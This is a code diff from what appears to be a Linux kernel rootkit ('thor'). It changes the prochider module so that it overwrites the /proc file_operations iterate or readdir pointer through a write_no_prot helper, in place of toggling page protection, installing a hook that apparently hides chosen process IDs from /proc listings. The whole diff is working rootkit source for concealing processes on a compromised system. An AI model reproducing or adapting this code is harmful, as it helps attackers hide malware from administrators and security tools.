@@ -46,6 +46,8 @@ static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
 
 int prochider_init(void)
 {
+    void *iterate_addr;
+
     /* insert our modified iterate for /proc */
     procroot = procfile->parent;
     proc_fops = (struct file_operations*) procroot->proc_fops;
@@ -55,13 +57,12 @@ int prochider_init(void)
     orig_proc_iterate = proc_fops->iterate;
 #endif
 
-    set_addr_rw(proc_fops);
+    iterate_addr = (void*) &(thor_proc_iterate);
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-    proc_fops->readdir = thor_proc_iterate;
+    write_no_prot(&proc_fops->readdir, &iterate_addr, sizeof(void*));
 #else
-    proc_fops->iterate = thor_proc_iterate;
+    write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
-    set_addr_ro(proc_fops);
 
     INIT_LIST_HEAD(&pid_list.list);
 
@@ -71,13 +72,12 @@ int prochider_init(void)
 void prochider_cleanup(void)
 {
     if (proc_fops != NULL && orig_proc_iterate != NULL) {
-        set_addr_rw(proc_fops);
+        void *iterate_addr = orig_proc_iterate;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-        proc_fops->readdir = orig_proc_iterate;
+        write_no_prot(&proc_fops->readdir, &iterate_addr, sizeof(void*));
 #else
-        proc_fops->iterate = orig_proc_iterate;
+        write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
-        set_addr_ro(proc_fops);
     }
 
     clear_pid_list();
